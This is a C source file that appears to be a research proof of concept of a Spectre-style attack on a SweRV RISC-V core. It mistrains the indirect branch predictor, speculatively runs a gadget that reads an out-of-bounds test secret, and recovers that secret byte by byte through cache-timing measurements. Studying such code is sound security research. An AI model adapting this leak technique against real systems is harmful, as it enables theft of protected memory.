typedef unsigned char uint8_t;
typedef unsigned long uint32_t;
typedef unsigned long long uint64_t;

#include "printf.c"
#include "cache.h"

// csr addresses (e.g. 0x7d2 -> mitcnt0) can be found either by searching the
// .sv files for them and converting the binary numbers to hex or by looking
// at the section 12 of SweRV manual (CSR Address Map)
#define rdcycle() ({ uint32_t tmp; \
      asm volatile("csrr %0, 0x7d2" : "=r" (tmp));     \
  tmp; })

// only accessible in Debug Mode (SweRV Manual p.13); should override it sometime.
#define fence_i() ({asm volatile ("csrrs t1, 0x7c4, 0x1\n");})

#define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
#define ROUNDS 10 // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS 1 // amount of times to attack the same index
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 20

uint32_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "!\"#ThisIsTheBabyBoomerTest";

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint32_t* inArray, uint32_t inArraySize, uint8_t* outIdxArray, uint32_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint32_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

/**
 * on the victim run this should be the function that should run. what should happen is that during the attack run
 * the victimFunc should run speculatively (it is the gadget) then the wantFunc should run
 */
void wantFunc(){
    asm("nop");
}

/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void victimFunc(uint32_t idx){
    printf("victimFunc: idx = %d\n", idx);
    // array1 is the secret -> we provide idx, so that array1[idx] == secret (we need to know that array1+idx points to secret)
    //                         when array1[idx] is speculatively accessed, the secret is used to store one item from the array2
    //                         elements in cache
    //                         the index of array2 (divided by ...) that was loaded in the cache is the value of the secret
    // array2 is the observer -> we can check which is the index |i| (aka secret) so that array2[i*...] is in the cache
    uint8_t dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
}

int main(void){
    printf("STARTING\n");
    uint32_t wantAddr = (uint32_t)(&wantFunc);
    uint32_t victimAddr = (uint32_t)(&victimFunc);
    uint32_t start, diff, passInAddr;
    uint32_t attackIdx = (uint32_t)(secretString - (char*)array1);
    uint32_t passInIdx, randIdx;
    uint8_t dummy = 0;
    uint8_t* addr;
    static uint32_t results[256];

    // try to read out the secret
    for(uint32_t len = 0; len < SECRET_SZ; ++len){

        // clear results every round
        for(uint32_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint32_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
            // make sure array you read from is not in the cache
            uint32_t sz = sizeof(array2);
            flushCache((uint32_t)array2, sz);
            randIdx = atkRound % array1_sz;

            for(int32_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                // bit twiddling to set (passInAddr, passInIdx)=(victimAddr, randIdx) or (wantAddr, attackIdx) after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                passInAddr = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInAddr=...FFFF0000 else 0
                passInAddr = (passInAddr | (passInAddr >> 16)); // set the passInAddr=-1 or 0
                passInAddr = victimAddr ^ (passInAddr & (wantAddr ^ victimAddr)); // select victimAddr or wantAddr 

                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 

                // set of constant takens to make the BHR be in a all taken state

                for(volatile uint32_t k = 0; k < 300; ++k){
                    asm("");
                }
                // this calls the function using jalr and delays the addr passed in through fdiv
                asm("addi %[addr], %[addr], -2\n"
                    "addi t1, zero, 2\n"
                    "slli t2, t1, 0x4\n"
                    "add t2, t2,  t1\n"
                    "srli t2, t2, 1\n"
                    "add t2, t2,  t1\n"
                    "srli t2, t2, 1\n"
                    "add t2, t2,  t1\n"
                    "srli t2, t2, 1\n"
                    "add t2, t2,  t1\n"
                    "srli t2, t2, 1\n"
                    "add %[addr], %[addr], t2\n"
                    "mv a0, %[arg]\n"
                    "jalr ra, %[addr], 0\n"
                    :
                    : [addr] "r" (passInAddr), [arg] "r" (passInIdx)
                    : "t1", "t2");
            }

            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            //
            // See which i has the best performance when
            // array2[i*...] is read. that i is the secret
            // uint32_t mdiff = 0xffffffff;
            for (uint32_t i = 0; i < 256; ++i){
                uint32_t mix_i = ((i * 167) + 13) & 255;
                addr = &array2[mix_i * L1_BLOCK_SZ_BYTES];
                start = rdcycle();
                dummy = *addr;
                diff = (rdcycle() - start);
                // if (diff<mdiff) {
                //   printf("i = %d --- diff = %d\n", i, diff);
                //   mdiff = diff;
                // }
                if ( diff < CACHE_HIT_THRESHOLD ){
                    results[mix_i] += 1;
                }
            }
        }

        // get highest and second highest result hit values
        uint8_t output[2];
        uint32_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%x] = want(%c) =?= guess(hits,dec,char) 1.(%d, %d, %c) 2.(%d, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 

        // read in the next secret
        ++attackIdx;
    }

    return 0;
}
